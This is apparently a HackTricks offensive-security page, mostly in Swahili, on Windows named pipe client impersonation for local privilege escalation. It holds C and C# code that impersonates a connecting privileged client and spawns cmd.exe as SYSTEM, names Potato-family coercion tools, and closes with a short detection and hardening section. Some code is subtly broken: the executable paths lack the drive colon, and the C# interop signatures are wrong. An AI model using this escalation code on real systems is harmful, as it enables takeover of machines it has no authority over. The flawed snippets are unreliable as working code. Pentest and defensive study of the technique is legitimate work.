# Uigaji wa Mteja wa Named Pipe

{{#include ../../banners/hacktricks-training.md}}

Uigaji wa mteja wa Named Pipe ni mbinu ya msingi ya kupandisha hadhi za eneo (local privilege escalation) inayoruhusu thread ya server ya named-pipe kuchukua muktadha wa usalama wa mteja anayeungana nayo. Katika vitendo, mshambulizi anayeweza kuendesha msimbo akiwa na SeImpersonatePrivilege anaweza kulazimisha mteja mwenye ruhusa (mfano, service ya SYSTEM) kuungana na pipe inayodhibitiwa na mshambulizi, kuitisha ImpersonateNamedPipeClient, kutengeneza nakala ya token iliyopatikana kuwa token kuu, na kuanzisha mchakato kama mteja (mara nyingi NT AUTHORITY\SYSTEM).

Ukurasa huu unalenga mbinu kuu. Kwa minyororo ya eksploit kuanzia mwanzo hadi mwisho zinazolazimisha SYSTEM kuungana na pipe yako, angalia Potato family pages zilizotajwa hapa chini.

## TL;DR
- Create a named pipe: \\.\pipe\<random> na subiri muunganisho.
- Fanya sehemu yenye ruhusa iungane nayo (spooler/DCOM/EFSRPC/etc.).
- Soma angalau ujumbe mmoja kutoka kwenye pipe, kisha ita ImpersonateNamedPipeClient.
- Fungua token ya uigaji kutoka thread ya sasa, DuplicateTokenEx(TokenPrimary), na CreateProcessWithTokenW/CreateProcessAsUser ili kupata mchakato wa SYSTEM.

## Requirements and key APIs
- PrivilegesTypically needed by the calling process/thread:
- SeImpersonatePrivilege to successfully impersonate a connecting client and to use CreateProcessWithTokenW.
- Alternatively, after impersonating SYSTEM, you can use CreateProcessAsUser, which may require SeAssignPrimaryTokenPrivilege and SeIncreaseQuotaPrivilege (these are satisfied when you’re impersonating SYSTEM).
- Core APIs used:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (must read at least one message before impersonation)
- ImpersonateNamedPipeClient and RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW or CreateProcessAsUser
- Impersonation level: to perform useful actions locally, the client must allow SecurityImpersonation (default for many local RPC/named-pipe clients). Clients can lower this with SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION when opening the pipe.

## Mtiririko mdogo wa Win32 (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Vidokezo:
- Ikiwa ImpersonateNamedPipeClient inarudisha ERROR_CANNOT_IMPERSONATE (1368), hakikisha unasoma kutoka kwenye pipe kwanza na kwamba client hakuzuia impersonation hadi kiwango cha Identification.
- Pendelea DuplicateTokenEx kwa SecurityImpersonation na TokenPrimary ili kuunda token kuu inayofaa kwa uundaji wa mchakato.

## .NET mfano mfupi
Katika .NET, NamedPipeServerStream inaweza kujifanya kupitia RunAsClient. Mara inapojifanya, nakili token ya thread na unda mchakato.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Vichocheo/vikandamizo vya kawaida ili kupata SYSTEM kwenye pipe yako
Mbinu hizi zinawalazimisha huduma zilizo na vibali (privileged services) kuungana na named pipe yako ili uweze kujifanya wao:
- Print Spooler RPC kichocheo (PrintSpoofer)
- Variant za DCOM activation/NTLM reflection (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Angalia utumiaji wa kina na ulinganifu hapa:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Ikiwa unahitaji mfano kamili wa kutengeneza pipe na kujifanya ili kuzalisha SYSTEM kutoka kwa kichocheo cha huduma, angalia:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

## Utatuzi wa matatizo na vidokezo muhimu
- Lazima usome angalau ujumbe mmoja kutoka kwa pipe kabla ya kuita ImpersonateNamedPipeClient; vinginevyo utapokea ERROR_CANNOT_IMPERSONATE (1368).
- Ikiwa client inaungana kwa SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, server haiwezi kujifanya kikamilifu; angalia kiwango cha kujifanya cha token kupitia GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW inahitaji SeImpersonatePrivilege kwa mtumaji. Ikiwa hiyo inashindwa na ERROR_PRIVILEGE_NOT_HELD (1314), tumia CreateProcessAsUser baada ya tayari kujifanya SYSTEM.
- Hakikisha security descriptor ya pipe yako inamruhusu huduma inayolengwa kuungana ikiwa umeifanya kuwa ngumu; kwa default, pipes chini ya \\.\pipe zinapatikana kwa mujibu wa DACL ya server.

## Ugunduzi na kuimarisha
- Fuatilia uundaji na muunganisho wa named pipe. Sysmon Event IDs 17 (Pipe Created) na 18 (Pipe Connected) ni muhimu kuanzisha mstari wa msingi wa majina halali ya pipe na kugundua pipes zisizo za kawaida zinazoonekana kuwa za nasibu kabla ya matukio ya utendakazi wa token.
- Tafuta mfululizo: mchakato unaunda pipe, huduma ya SYSTEM inaunda muunganisho, kisha mchakato uliounda unazalisha mchakato mtoto kama SYSTEM.
- Punguza mfao kwa kuondoa SeImpersonatePrivilege kutoka kwa akaunti za huduma zisizo za lazima na kuepuka kuingia kwa huduma zisizo za lazima zenye vibali vya juu.
- Maendeleo ya kujilinda: wakati wa kuungana na named pipes zisizo za kuaminika, taja SECURITY_SQOS_PRESENT pamoja na SECURITY_IDENTIFICATION ili kuzuia servers kujifanya kikamilifu client isipokuwa inapohitajika.

## Marejeo
- Windows: ImpersonateNamedPipeClient documentation (mahitaji ya kujifanya na tabia). https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient
- ired.team: Windows named pipes privilege escalation (mwongozo na mifano ya code). https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation

{{#include ../../banners/hacktricks-training.md}}
